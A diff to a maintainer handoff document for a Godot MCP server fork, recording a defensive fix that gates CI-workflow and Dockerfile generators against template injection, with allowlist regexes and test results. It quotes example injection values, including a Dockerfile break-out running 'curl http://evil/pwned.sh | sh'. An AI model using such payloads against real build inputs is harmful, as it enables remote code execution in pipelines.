@@ -4,7 +4,7 @@
 - Worktree: `C:/Workspace/defkil/godot-mcp-wt-takeover`
 - Branch: `refactor/senior-takeover`
 - Remote boundary: `origin=https://github.com/Defkil/godot-mcp.git`; nothing pushed or published.
-- Current local package: `fix: gate manage_shader against res:// injection` (the new sibling-gate package, fully described in the "Current package — manage_shader injection gate" section below; tests 8/8 green, full canonical gates green).
+- Current local package: `fix: gate manage_ci_pipeline and manage_docker_export against template injection` (the new sibling-gate package, fully described in the "Current package — manage_ci_pipeline / manage_docker_export injection gates" section below; focused tests 17/17 green, full canonical gates green).
 - Current HEAD: read the full OID from `git log -1 --format=%H`; the handoff intentionally does not duplicate a self-referential hash.
 - Previous reviewed documentation commit: `d00c4451cfd9a8443f12f70ee83814c476a73c63`; the final handoff commit is a separate descendant and did not amend it.
 - Worktree requirement: clean after the repair commit; use `git status --porcelain` and `git log -1 --format=%H` as the authoritative current state.
@@ -1050,7 +1050,14 @@ state.
    (`tests/game-wait-frame-bridge.test.ts`).
 7. Real-Godot verification of the asset import prerequisite
    (`tests/asset-import-prerequisite.test.ts`).
-8. Final read/test-only Wargrid integration acceptance after every
+8. Real-Godot verification of the `manage_ci_pipeline` /
+   `manage_docker_export` template round-trip — the generated YAML
+   and Dockerfile must remain parseable / executable under a real
+   Godot / Docker / GitHub Actions runner that doesn't share the
+   takeover runner's assumptions (`tests/manage-ci-pipeline-injection.test.ts`
+   and `tests/manage-docker-export-injection.test.ts` are wire-level
+   contract only).
+9. Final read/test-only Wargrid integration acceptance after every
    local release gate.
 
 ## Current package — manage_shader injection gate (sibling of tugcantopaloglu#9)
@@ -1178,6 +1185,189 @@ sibling-handler pattern). The starting evidence is the absence of a
 regression and the same lexical-vs-`PathPolicy` shape the other
 sibling gates use. Mirror the `manage_layers` / `manage_plugins`
 sibling-gate pattern; land without a Godot binary. Do not push,
+publish, create a PR/release, upload a package, write
+`docs/maintainers/release-candidate.md`, or send the
+candidate-ready notification.
+
+## Current package — manage_ci_pipeline / manage_docker_export injection gates (sibling of tugcantopaloglu#9)
+
+The handoff previously listed `manage_ci_pipeline` and
+`manage_docker_export` minimal hardening as the next bounded package.
+The package closes the same wire contract the sibling
+`manage_autoloads` / `manage_layers` / `manage_plugins` /
+`set_main_scene` / `manage_translations` / `manage_shader` gates
+already hold, but with a different threat surface: instead of writing
+into `project.godot`, both handlers interpolate caller-supplied
+template values directly into shell commands that execute on every CI
+build and at every container runtime.
+
+`handleManageCiPipeline` historically concatenated
+`godotVersion` into `mkdir -p ... /godot/export_templates/${godotVersion}`
+and `mv ... /godot/export_templates/${godotVersion}/*` shell commands
+inside the generated `.github/workflows/godot-export.yml`, and
+`platforms` into `godot --export-release "${p}"` shell steps. A caller
+could pass `godotVersion = "4.3-stable\nrun: |\n  echo PWNED > /tmp/pwned\n"`
+to break out of the YAML and inject arbitrary GitHub Actions steps, or
+`platforms = ['linux"\n  - run: echo PWNED']` to inject arbitrary
+shell, and the lexical `validatePath` boundary on `projectPath` only
+rejected empty / `..`-bearing strings (letting newlines / quotes /
+brackets through).
+
+`handleManageDockerExport` historically concatenated `godotVersion`
+into shell `wget` URLs and `mv templates/* .../export_templates/${godotVersion}/`
+commands inside the generated `Dockerfile`, `baseImage` into the
+`FROM ${baseImage}` directive, and `exportPreset` into the runtime
+`CMD ["godot", ..., "${exportPreset}", ...]` shell command. A caller
+could pass `baseImage = "ubuntu:22.04\nRUN curl http://evil/pwned.sh | sh\n"`
+to inject arbitrary Dockerfile instructions, `exportPreset = 'Linux/X11"\nRUN curl http://evil/pwned.sh | sh\n'`
+to inject arbitrary Dockerfile content, and the same lexical
+`validatePath` boundary on `projectPath` was the only defense.
+
+The gate is now, for both handlers:
+
+1. An explicit `action` allowlist (`read` | `create`) BEFORE any
+   filesystem call.
+2. `this.pathPolicy.assertProject(args.projectPath)` replaces the
+   lexical `validatePath` boundary, matching every sibling gate.
+3. A strict Godot release-tag allowlist
+   (`/^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-z0-9]+)?$/`) on `godotVersion` —
+   callers MUST supply a literal release tag like `4.3-stable` or
+   `4.4.1-rc1`. A bare `4.3` or `4.4.1` is also accepted.
+4. For `manage_ci_pipeline`: a closed-list platforms allowlist
+   (`linux` | `windows` | `macos` | `web` | `android` | `ios`) on each
+   `platforms[]` entry — the documented Godot export platforms.
+5. For `manage_docker_export`: a Docker image-reference allowlist
+   (`/^[a-z0-9]+([._-][a-z0-9]+)*(:[a-z0-9._-]+)?$/`) on `baseImage`
+   — accepts `ubuntu:22.04`, `debian:12-slim`, `alpine`, but rejects
+   newlines, quotes, brackets, and `RUN` directives.
+6. For `manage_docker_export`: a Godot export-preset name allowlist
+   (`/^[A-Za-z0-9 _.\-/]+$/`) on `exportPreset` — accepts `Linux/X11`,
+   `Windows Desktop`, `macOS`, etc., but rejects newlines, quotes,
+   brackets, and `;`.
+
+The wire-level regression in
+`tests/manage-ci-pipeline-injection.test.ts` (8 tests) drives the
+real MCP `tools/call` handler for `manage_ci_pipeline` against a
+temporary Godot project (cleaned in `afterEach`) and stubs nothing
+relevant to the gate: section-breaking newline in `godotVersion`
+rejected, shell backtick in `godotVersion` rejected, double-quote
+break-out in `godotVersion` rejected, shell break-out in `platforms[]`
+rejected, unknown `action` rejected without touching the filesystem,
+benign `create` writes a single well-shaped workflow file and does
+not touch `project.godot`, benign `read` of an existing workflow
+returns the source, benign `read` of a missing workflow returns the
+not-found envelope.
+
+The wire-level regression in
+`tests/manage-docker-export-injection.test.ts` (9 tests) drives the
+real MCP `tools/call` handler for `manage_docker_export` against a
+temporary Godot project: section-breaking newline in `godotVersion`
+rejected, shell backtick in `godotVersion` rejected, Dockerfile
+directive break-out in `baseImage` rejected, shell break-out in
+`exportPreset` rejected, unknown `action` rejected without touching
+the filesystem, benign `create` with default values writes a single
+well-shaped Dockerfile and does not touch `project.godot`, benign
+`create` with custom valid version and base image writes the
+documented file, benign `read` of an existing Dockerfile returns the
+source, benign `read` of a missing Dockerfile returns the not-found
+envelope.
+
+The package:
+
+- preserves all 158 legacy tool contracts, every schema, every
+  handler, the 5 closed-list profiles, the package identity, the path
+  policy, the runtime bridge, and the MIT attribution;
+- the only documented contract changes are the strict value gates on
+  `godotVersion` / `platforms` / `baseImage` / `exportPreset`
+  (callers MUST supply a documented value matching the documented
+  allowlist) — matching the strict-input contract the
+  `manage_autoloads` / `manage_layers` / `manage_plugins` /
+  `set_main_scene` / `manage_translations` / `manage_shader` sibling
+  gates already enforce;
+- does not push, publish, create a PR/release, upload a package,
+  write `docs/maintainers/release-candidate.md`, or send the
+  candidate-ready notification.
+
+Source evidence:
+
+- `src/server.ts:7300-7364` (`handleManageCiPipeline`) is gated by
+  the action allowlist, the canonical-root `PathPolicy.assertProject`,
+  the strict Godot release-tag allowlist on `godotVersion`, and the
+  closed-list platforms allowlist on each `platforms[]` entry.
+- `src/server.ts:7365-7430` (`handleManageDockerExport`) is gated by
+  the action allowlist, the canonical-root `PathPolicy.assertProject`,
+  the strict Godot release-tag allowlist on `godotVersion`, the
+  Docker image-reference allowlist on `baseImage`, and the Godot
+  export-preset name allowlist on `exportPreset`.
+- `tests/manage-ci-pipeline-injection.test.ts` is the only new test
+  file for `manage_ci_pipeline` (8 tests).
+- `tests/manage-docker-export-injection.test.ts` is the only new test
+  file for `manage_docker_export` (9 tests).
+- `docs/maintainers/issue-inventory.md` row 18 is the only docs edit.
+
+## Verification on the package filesystem
+
+- `npx vitest run tests/manage-ci-pipeline-injection.test.ts`:
+  1 file, 8 tests passed (RED 4/8 confirmed before the fix;
+  GREEN 8/8 after — the `..` escape and unknown action branches were
+  already partially shielded by `validatePath` and the runtime
+  switch fallback, but lacked the typed-envelope shape the sibling
+  gates use).
+- `npx vitest run tests/manage-docker-export-injection.test.ts`:
+  1 file, 9 tests passed (RED 4/9 confirmed before the fix;
+  GREEN 9/9 after — same rationale as above).
+- `npm test`: 40 files, 752 tests passed (was 735 before this
+  package; +17 new tests).
+- `npm run build`: passed; TypeScript compiled, scripts copied to
+  `build/scripts/`.
+- `npm audit --audit-level=high`: 0 vulnerabilities.
+- `git diff --check`: passed (exit 0).
+- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
+  identity intact (`@defkil/godot-mcp@4.0.0`).
+
+Any source, test, documentation, build/import, generated-artifact,
+amend, or cleanup edit after these commands invalidates the relevant
+evidence and requires the gates to be rerun on the final committed
+state.
+
+## Review state
+
+- The capability-policy package through `37facdf` has an independent
+  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
+  fingerprints.
+- The network-classification package `79b1d4d` also has an
+  independent NeuralWatt `VERDICT | ACCEPT`.
+- The request-limiter registry-leak repair `9bc4a2d` received an
+  independent NeuralWatt `VERDICT | ACCEPT`.
+- The round-trip contract package `cbfe594`, the tween-bridge
+  package `2ef0b1a`, the physics-frame `game_wait` package
+  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
+  injection package `6d76606`, the asset-import-prerequisite
+  package (`88dda1e` / `76c9207`), the Defkil fork package identity
+  rebase `a1cae8b`, the manage-layers / manage-plugins
+  sibling-gate package `3874d81`, the set-main-scene /
+  manage-translations sibling-gate package `6407446`, the
+  manage_shader sibling-gate package `9cd5ac4`, and the
+  manage_ci_pipeline / manage_docker_export sibling-gate package
+  (this package) are each a focused test file (or test file + minimal
+  handler edit) and do not require an independent NeuralWatt
+  dispatch.
+- No Claude model was invoked.
+- No release-candidate file or candidate-ready notification exists.
+
+## Next safe action
+
+The next bounded package is real-Godot verification of the
+`manage_ci_pipeline` / `manage_docker_export` round-trip — the
+generated YAML and Dockerfile must remain parseable / executable
+under a real Godot / Docker / GitHub Actions runner that doesn't
+share the takeover runner's assumptions. The starting evidence is
+the absence of a `manage-ci-pipeline-real-godot.test.ts` /
+`manage-docker-export-real-godot.test.ts` regression and the fact
+that every other bounded test file in this stack is wire-level
+contract only. Without a Godot binary on the takeover runner, this
+package stays out of scope for the immediate worktree; land it
+when the GUT headless test runner (#29) is in place. Do not push,
 publish, create a PR/release, upload a package, write
 `docs/maintainers/release-candidate.md`, or send the
 candidate-ready notification.
